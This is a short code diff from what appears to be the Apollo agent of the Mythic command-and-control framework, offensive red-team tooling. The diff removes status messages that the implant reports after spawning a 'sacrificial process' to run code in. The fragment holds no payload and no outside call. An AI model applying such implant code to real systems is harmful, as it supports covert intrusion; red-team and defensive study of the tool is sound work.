@@ -240,12 +240,6 @@ namespace Apollo.CommandModules
 
                 if (sacrificialProcess.Start())
                 {
-                    string status = "";
-                    if (!string.IsNullOrEmpty(startupArgs.Arguments))
-                        status = $"Sacrificial process spawned '{startupArgs.Application} {startupArgs.Arguments}' (PID: {sacrificialProcess.PID})\n";
-                    else
-                        status = $"Sacrificial process spawned {startupArgs.Application} (PID: {sacrificialProcess.PID})\n";
-                    job.AddOutput(status);
                     job.ProcessID = (int)sacrificialProcess.PID;
                     job.sacrificialProcess = sacrificialProcess;
                     asmResponse = new Mythic.Structs.AssemblyResponse()
